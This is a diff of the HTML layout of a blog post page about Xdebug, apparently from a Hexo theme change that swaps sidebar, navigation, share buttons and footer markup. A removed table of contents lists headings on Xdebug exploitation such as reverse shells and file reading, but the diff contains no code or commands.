-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
 
 
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/24/php-session/"
+                    data-tooltip="php-session"
+                    aria-label="上一篇: php-session"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/23/xxe/"
+                    data-tooltip="xxe"
+                    aria-label="下一篇: xxe"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
         </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
-          <p class="site-author-name" itemprop="name">John Doe</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">47</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
             
-              
             
-
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工作原理"><span class="nav-number">1.1.</span> <span class="nav-text">工作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#回连地址"><span class="nav-number">1.1.1.</span> <span class="nav-text">回连地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#固定ip模式"><span class="nav-number">1.1.2.</span> <span class="nav-text">固定ip模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非固定ip模式"><span class="nav-number">1.1.3.</span> <span class="nav-text">非固定ip模式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">1.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBGp协议"><span class="nav-number">1.3.</span> <span class="nav-text">DBGp协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#source"><span class="nav-number">1.3.1.</span> <span class="nav-text">source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval"><span class="nav-number">1.3.2.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#property-set"><span class="nav-number">1.3.3.</span> <span class="nav-text">property_set</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击链"><span class="nav-number">2.0.1.</span> <span class="nav-text">攻击链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行命令"><span class="nav-number">2.1.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file协议读文件"><span class="nav-number">2.2.</span> <span class="nav-text">file协议读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用source读文件"><span class="nav-number">2.3.</span> <span class="nav-text">利用source读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写木马"><span class="nav-number">2.5.</span> <span class="nav-text">写木马</span></a></li></ol></div>
             
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
 
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
-      
-
+        
+        
+            
+        
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2020 John Doe. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/24/php-session/"
+                    data-tooltip="php-session"
+                    aria-label="上一篇: php-session"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/23/xxe/"
+                    data-tooltip="xxe"
+                    aria-label="下一篇: xxe"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/xdebug/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
 </div>
 
 
-<div class="powered-by">
-  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
-</div>
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/xdebug/"
+                        aria-label="分享到 Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/xdebug/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/xdebug/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
 
-
+            
+        </div>
         
 
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
         
-      </div>
-    </footer>
+            <h4 id="about-card-name">John Doe</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
+<!--SCRIPTS END-->
+
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
-  </div>
 
-  
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
